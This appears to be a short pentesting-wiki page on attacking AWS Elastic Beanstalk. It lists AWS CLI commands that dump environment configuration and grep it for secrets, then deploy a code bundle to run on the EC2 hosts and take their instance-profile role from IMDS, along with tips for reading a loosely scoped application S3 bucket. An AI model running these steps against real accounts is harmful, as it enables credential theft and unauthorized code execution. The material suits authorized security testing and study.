---
title: "Elastic Beanstalk: environment role and configuration secrets"
description: "Abusing Elastic Beanstalk environments and their instance-profile role, plus secrets exposed in environment configuration."
keywords:
  - Elastic Beanstalk
  - instance profile
  - environment
  - S3
  - deployment
---

# Elastic Beanstalk

Elastic Beanstalk wraps EC2, an S3 application bucket, and an instance profile into a managed environment. The platform exposes two things worth taking: the **environment configuration**, which often carries secrets in environment properties, and the **instance-profile role** on the underlying EC2 hosts, reachable the moment you run code on them.

## Reading configuration and deploying code

```bash
aws elasticbeanstalk describe-configuration-settings --application-name <a> --environment-name <e> \
  --query 'ConfigurationSettings[].OptionSettings' | grep -iE 'env|secret|password'

# Application versions live in an S3 bucket; a new version deploys your code
aws elasticbeanstalk describe-applications
aws s3 cp app.zip s3://elasticbeanstalk-<region>-<acct>/<path>
aws elasticbeanstalk create-application-version --application-name <a> \
  --version-label x --source-bundle S3Bucket=...,S3Key=...
aws elasticbeanstalk update-environment --environment-name <e> --version-label x
```

## Exploitation notes

- Environment properties are the usual secret store for Beanstalk apps; dump them first.
- Deploying an application version runs your code on the environment's EC2 hosts, which yields the instance-profile role from IMDS.
- The S3 application bucket itself is often loosely scoped; read it directly where the API is denied.

## Tools

- **AWS CLI** (`elasticbeanstalk describe-configuration-settings`, `create-application-version`).

## References

- [HackTricks Cloud: Elastic Beanstalk](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-elastic-beanstalk-enum.html)
- [AWS: Elastic Beanstalk environment configuration](https://docs.aws.amazon.com/elasticbeanstalk/latest/dg/command-options.html)
